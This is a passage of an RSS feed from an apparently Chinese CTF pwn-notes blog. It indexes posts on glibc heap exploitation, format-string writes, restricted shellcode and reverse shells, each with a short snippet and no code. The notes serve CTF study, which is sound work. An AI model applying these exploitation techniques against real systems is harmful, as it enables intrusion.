溢出</description></item><item><title>堆tricks</title><link>/pwn1/%E5%A0%86/tricks/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86/tricks/</guid><description>[TOC] 1. 泄露libcbase，heapbase 2. 打free_hook或IO_FILE 保护机制 泄露heapbase 一般想要泄露heapbase的情</description></item><item><title>堆分配（自己复现）</title><link>/pwn1/%E5%A0%86/%E5%A0%86%E5%88%86%E9%85%8D%E8%87%AA%E5%B7%B1%E5%A4%8D%E7%8E%B0/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86/%E5%A0%86%E5%88%86%E9%85%8D%E8%87%AA%E5%B7%B1%E5%A4%8D%E7%8E%B0/</guid><description>[TOC] 一篇讲的比较清楚的博客 malloc函数 说明：first chunk是指bin中链表头部的chunk,last chunk是指bin中链表尾部的</description></item><item><title>堆分配机制</title><link>/pwn1/%E5%A0%86/%E5%A0%86%E5%88%86%E9%85%8D%E6%9C%BA%E5%88%B6/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86/%E5%A0%86%E5%88%86%E9%85%8D%E6%9C%BA%E5%88%B6/</guid><description>[TOC] 一篇讲的很好的博客 概念明晰 bins的链表用的是头插法 fd和bk只在bins才有 在堆中prev chunk就是比它地址低的，next chunk</description></item><item><title>反弹shell</title><link>/pwn1/others/%E5%8F%8D%E5%BC%B9shell/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/others/%E5%8F%8D%E5%BC%B9shell/</guid><description>[TOC] 参考博客 关闭了标准输入、标准输出、标准错误时可以利用反弹shell 反弹shell connect()+dupsh() - 反连 实测这种最好用,这里的ip要填写自己的wsl的ip</description></item><item><title>非栈上格式化字符串</title><link>/pwn1/format_string/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/format_string/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</guid><description>（非栈上格式化字符串）往retaddr写一个orw，这种一般都要有无限次写才行,同时要找到栈上一个链才行 要注意链写的时候不要被覆盖，%{0}</description></item><item><title>高版本off-by-null</title><link>/pwn1/%E5%A0%86%E6%9D%82%E8%AE%B0/%E9%AB%98%E7%89%88%E6%9C%ACoff-by-null/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%9D%82%E8%AE%B0/%E9%AB%98%E7%89%88%E6%9C%ACoff-by-null/</guid><description>[TOC] 思路分析 贴一个 参考博客 多了几个步骤： 一个伪造fake chunk的过程 伪造了size还得满足__builtin_expect (fd-&amp;gt;bk != p || bk-&amp;gt;fd != p, 0</description></item><item><title>高版本打tcache</title><link>/pwn1/%E5%A0%86%E6%9D%82%E8%AE%B0/%E9%AB%98%E7%89%88%E6%9C%AC%E6%89%93tcache/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%9D%82%E8%AE%B0/%E9%AB%98%E7%89%88%E6%9C%AC%E6%89%93tcache/</guid><description>[TOC] 前言 在此之前，笔者libc2.35都固化思维地只会largebin attack然后打IO，一遇到高版本还打tcache的好像束手无策 但是l</description></item><item><title>关于泄露</title><link>/pwn1/%E5%A0%86%E6%9D%82%E8%AE%B0/%E5%85%B3%E4%BA%8E%E6%B3%84%E9%9C%B2/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%9D%82%E8%AE%B0/%E5%85%B3%E4%BA%8E%E6%B3%84%E9%9C%B2/</guid><description>打NKCTF2024有一个libc2.23的堆题，虽然笔者不太会libc2.23的堆还是想看一看这个题 堆溢出里面泄露不要只想着传统的通过ch</description></item><item><title>函数参数传递</title><link>/pwn1/stackoverflow/%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/stackoverflow/%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92/</guid><description>64位函数参数传递 主要区别在于第4个参数，一般函数调用第4个参数是rcx存储，系统调用是r10存储</description></item><item><title>奇奇怪怪的东西</title><link>/pwn1/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E4%B8%9C%E8%A5%BF/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E4%B8%9C%E8%A5%BF/</guid><description>有时候题目没给ld文件，给了so文件，自己patchelf后反而不能运行 tar -xvf filename.tar</description></item><item><title>受限制的shellcode</title><link>/pwn1/shellcode/%E5%8F%97%E9%99%90%E5%88%B6%E7%9A%84shellcode/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/shellcode/%E5%8F%97%E9%99%90%E5%88%B6%E7%9A%84shellcode/</guid><description>[TOC] 这篇博客不错 shellcode字长受限 一种解决方法是先写入read函数然后再read任意长度的shellcode 无法使用syscall 发现</description></item><item><title>栈对齐</title><link>/pwn1/stackoverflow/%E6%A0%88%E5%AF%B9%E9%BD%90/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/stackoverflow/%E6%A0%88%E5%AF%B9%E9%BD%90/</guid><description>高版本的Ubuntu执行system或者printf需要高16位栈对齐 一般的做法就是垫一个ret或者不要system完整函数里面的pop rbp 后</description></item><item><title>栈上格式化字符串</title><link>/pwn1/format_string/%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/format_string/%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</guid><description>往栈上某个地址一次写入6个字节 #target是目标地址，n0是想要写入的东西,k为ljust之后p64(target)为格式化字符串的第几个</description></item><item><title>最常用的house攻击</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/%E6%9C%80%E5%B8%B8%E7%94%A8%E7%9A%84house%E6%94%BB%E5%87%BB/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/%E6%9C%80%E5%B8%B8%E7%94%A8%E7%9A%84house%E6%94%BB%E5%87%BB/</guid><description>[TOC] 经验总结 _IO_list_all,IO_2_1_stderr,stderr看情况写哪个 FROP打house of apple2,malloc_a</description></item><item><title>做题遇到的函数</title><link>/pwn1/others/%E5%81%9A%E9%A2%98%E9%81%87%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/others/%E5%81%9A%E9%A2%98%E9%81%87%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0/</guid><description>[TOC] strtoull函数 munmap函数 setvbuf函数 fgets函数 char *fgets(char *str, int n, FILE *stream); fgets() 从 stream 中读取字符，直到读取了 n-1 个字符、读取并转移到字符串</description></item></channel></rss>